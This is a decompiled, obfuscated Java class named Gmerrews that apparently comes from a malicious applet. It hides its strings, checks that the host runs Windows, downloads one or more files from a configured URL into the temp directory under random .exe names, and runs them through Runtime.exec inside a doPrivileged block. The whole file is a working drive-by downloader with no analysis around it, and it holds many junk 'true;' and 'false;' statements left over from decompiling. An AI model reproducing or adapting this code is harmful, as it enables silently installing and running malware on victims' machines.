// 
// Decompiled by Procyon v0.5.30
// 

package quote;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class Gmerrews implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        true;
        true;
        true;
        false;
        final int n = 2;
        false;
        false;
        true;
        final byte[] array = new byte[s.length() / n];
        true;
        false;
        false;
        true;
        final int n2 = 16;
        false;
        false;
        false;
        false;
        false;
        for (int i = 0; i < s.length(); i += n) {
            false;
            false;
            false;
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
            false;
        }
        true;
        false;
        true;
        true;
        false;
        false;
        return array;
    }
    
    @Override
    public Object run() throws Exception {
        false;
        if (Gmerrews.data == null) {
            return null;
        }
        true;
        false;
        try {
            true;
            true;
            true;
            false;
            false;
            true;
            true;
            true;
            final String property = System.getProperty("osCCCC.namCCe".replace("C", ""));
            false;
            false;
            true;
            false;
            false;
            true;
            if (property.indexOf("pppWppppippndpppppopppwsppp".replace("p", "")) == -1) {
                true;
                true;
                false;
                true;
                return null;
            }
            true;
            false;
            false;
            false;
            false;
            int int1 = 1;
            false;
            false;
            false;
            if (Gmerrews.cc != null) {
                false;
                int1 = Integer.parseInt(Gmerrews.cc);
                true;
                false;
                true;
            }
            true;
            for (int i = 0; i < int1; ++i) {
                false;
                true;
                true;
                final String string = Gmerrews.data + Integer.toString(i);
                false;
                false;
                false;
                false;
                final URL url = new URL(string);
                true;
                true;
                true;
                false;
                false;
                true;
                false;
                true;
                true;
                url.openConnection();
                true;
                true;
                false;
                true;
                final InputStream openStream = url.openStream();
                true;
                true;
                final String property2 = System.getProperty(";;j;;;;av;;;;;;;a.i;;;;o.;t;mp;;;;d;;;;ir".replace(";", ""));
                true;
                false;
                false;
                true;
                false;
                true;
                final String string2 = property2 + File.separator;
                false;
                true;
                final String string3 = string2 + Math.random() + ".___e____x___e".replace("_", "");
                true;
                false;
                false;
                false;
                false;
                final FileOutputStream fileOutputStream = new FileOutputStream(string3);
                false;
                false;
                false;
                false;
                int n = 0;
                int read;
                while ((read = openStream.read()) != -1) {
                    true;
                    fileOutputStream.write(read);
                    ++n;
                }
                false;
                false;
                false;
                false;
                false;
                openStream.close();
                false;
                fileOutputStream.close();
                true;
                false;
                this.Caller(n, string3);
                false;
                false;
            }
            false;
            false;
            false;
        }
        catch (Exception ex) {
            true;
            false;
            false;
            true;
        }
        true;
        true;
        true;
        true;
        return null;
    }
    
    private void Caller(final int n, final String s) throws Exception {
        final Runtime runtime = Runtime.getRuntime();
        Boolean b = false;
        if (n >= 1024) {
            b = true;
        }
        if (b) {
            this.ef(runtime, s);
        }
    }
    
    private Process ef(final Runtime runtime, final String s) throws Exception {
        false;
        false;
        return runtime.exec(s, null, null);
    }
    
    public Gmerrews() {
        false;
        true;
        try {
            true;
            true;
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
            false;
        }
        catch (Exception ex) {
            false;
            false;
            true;
            true;
            true;
        }
        false;
        false;
        true;
        true;
    }
    
    static {
        Gmerrews.data = null;
        Gmerrews.cc = null;
    }
}
